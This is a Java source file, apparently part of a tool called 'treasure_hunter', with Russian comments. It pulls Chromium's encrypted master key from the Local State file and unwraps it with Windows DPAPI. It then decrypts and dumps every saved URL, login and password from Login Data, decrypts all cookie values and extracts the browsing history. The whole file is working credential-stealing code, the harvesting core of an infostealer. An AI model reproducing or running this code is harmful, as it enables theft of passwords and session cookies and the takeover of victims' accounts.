package com.treasure_hunter_java.decrypt;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.sql.*;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.*;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import com.sun.jna.platform.win32.Crypt32Util;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Класс Decrypt предоставляет методы для расшифровки данных.
 */
public class Decrypt {

    private static String dbConnection = "jdbc:sqlite:";

    /**
     * Получает мастер-ключ для расшифровки данных.
     *
     * @param directory директория, содержащая файл Local State
     * @return массив байтов с мастер-ключом
     * @throws Exception если происходит ошибка при получении мастер-ключа
     */
    public static byte[] getMasterKey(String directory) throws Exception {
        Path localStateFile = Path.of(directory + "/Local State");
        String localState = Files.readString(localStateFile, StandardCharsets.UTF_8);
        String masterKeyB64 = "";
        Pattern pattern = Pattern.compile("\"encrypted_key\":\"([^\"]+)\"");
        Matcher matcher = pattern.matcher(localState);
        if (matcher.find()) {
            masterKeyB64 = matcher.group(1);
        }
        byte[] masterKeyEnc = Base64.getDecoder().decode(masterKeyB64.getBytes(StandardCharsets.UTF_8));
        return Crypt32Util.cryptUnprotectData(Arrays.copyOfRange(masterKeyEnc, 5, masterKeyEnc.length));
    }

    private static final int GCM_TAG_LENGTH = 128;
    private static final int IV_LENGTH = 12;

    /**
     * Метод для дешифровки одного пароля.
     *
     * @param passwordBytes массив байтов с зашифрованным паролем
     * @param masterKey     мастер-ключ для расшифровки
     * @return расшифрованный пароль
     * @throws Exception если происходит ошибка при расшифровке пароля
     */
    public static String decryptPassword(byte[] passwordBytes, byte[] masterKey) throws Exception {
        byte[] iv = Arrays.copyOfRange(passwordBytes, 3, IV_LENGTH + 3);
        byte[] ciphertext = Arrays.copyOfRange(passwordBytes, IV_LENGTH + 3, passwordBytes.length);

        SecretKeySpec keySpec = new SecretKeySpec(masterKey, "AES");
        GCMParameterSpec parameterSpec = new GCMParameterSpec(GCM_TAG_LENGTH, iv);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, keySpec, parameterSpec);

        byte[] decryptedPasswordBytes = cipher.doFinal(ciphertext);
        return new String(decryptedPasswordBytes, StandardCharsets.UTF_8);
    }

    /**
     * Расшифровывает пароли из Login Data.
     *
     * @param directory директория, содержащая файл базы данных
     * @return расшифрованные пароли в виде строки
     * @throws Exception если происходит ошибка при расшифровке паролей
     */
    public static String decryptPasswords(String directory) throws Exception {
        StringBuilder textBuilder = new StringBuilder("URL | LOGIN | PASSWORD\n");

        File dbFile = new File(directory + "/Login Data");
        try (Connection conn = DriverManager.getConnection(dbConnection + dbFile.getAbsolutePath());
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery("SELECT action_url, username_value, password_value FROM logins")) {

            byte[] masterKey = getMasterKey(directory);

            while (rs.next()) {
                byte[] passwordBytes = rs.getBytes("password_value");
                String decryptedPassword = decryptPassword(passwordBytes, masterKey);
                String url = rs.getString("action_url");
                String login = rs.getString("username_value");
                if (!decryptedPassword.isEmpty()) {
                    textBuilder.append(url).append(" | ").append(login).append(" | ").append(decryptedPassword).append("\n");
                }
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }

        return textBuilder.toString();
    }

    /**
     * Извлекает информацию о cookies.
     *
     * @param directory директория, содержащая файл базы данных cookies
     * @return информация о cookies в виде строки
     * @throws Exception если происходит ошибка при извлечении информации о cookies
     */
    public static String extractCookies(String directory) throws Exception {
        byte[] key = getMasterKey(directory);
        StringBuilder textBuilder = new StringBuilder();
        File dbFile = new File(directory + "/Cookies");
        try (Connection conn = DriverManager.getConnection(dbConnection + dbFile.getAbsolutePath());
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery("SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies")) {

            while (rs.next()) {
                String hostKey = rs.getString("host_key");
                String name = rs.getString("name");
                String value = rs.getString("value");
                long creationUtc = rs.getLong("creation_utc");
                long lastAccessUtc = rs.getLong("last_access_utc");
                long expiresUtc = rs.getLong("expires_utc");
                byte[] encryptedValue = rs.getBytes("encrypted_value");

                String decryptedValue;
                if (value == null || value.isEmpty()) {
                    decryptedValue = decryptPassword(encryptedValue, key);
                } else {
                    decryptedValue = value;
                }

                textBuilder.append("Host: ").append(hostKey)
                        .append("\nCookie name: ").append(name)
                        .append("\nCookie value (decrypted): ").append(decryptedValue)
                        .append("\nCreation datetime (UTC): ").append(getDatetime(creationUtc))
                        .append("\nLast access datetime (UTC): ").append(getDatetime(lastAccessUtc))
                        .append("\nExpires datetime (UTC): ").append(getDatetime(expiresUtc))
                        .append("\n===============================================================\n");
            }

        } catch (SQLException e) {
            e.printStackTrace();
        }

        return textBuilder.toString();
    }

    /**
     * Получает историю посещений.
     *
     * @param historyPath путь к файлу истории
     * @return история посещений в виде строки
     */
    public static String getHistory(String historyPath) {
        StringBuilder textBuilder = new StringBuilder("\n");

        File dbFile = new File(historyPath);

        try (Connection conn = DriverManager.getConnection(dbConnection + dbFile.getAbsolutePath());
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery("SELECT u.id, u.url, u.title, " +
                     "datetime(v.visit_time / 1000000 + (strftime('%s', '1601-01-01')), 'unixepoch') " +
                     "AS visit_time " +
                     "FROM urls u " +
                     "JOIN visits v ON u.id = v.url")) {

            while (rs.next()) {
                int id = rs.getInt("id");
                String url = rs.getString("url");
                String title = rs.getString("title");
                String date = rs.getString("visit_time");
                textBuilder.append("ID: ").append(id)
                        .append(" | URL: ").append(url)
                        .append(" | Title: ").append(title)
                        .append(" | Time: ").append(date)
                        .append("\n");
            }

        } catch (SQLException e) {
            e.printStackTrace();
        }
        return textBuilder.toString();
    }

    /**
     * Преобразует UTC-временную метку в строку даты и времени.
     *
     * @param utcTimestamp UTC-временная метка
     * @return строка даты и времени
     */
    private static String getDatetime(long utcTimestamp) {
        LocalDateTime epochDateTime = LocalDateTime.of(1601, 1, 1, 0, 0, 0);
        LocalDateTime dateTime = epochDateTime.plusSeconds(utcTimestamp / 1000000);
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
        return dateTime.format(formatter);
    }
}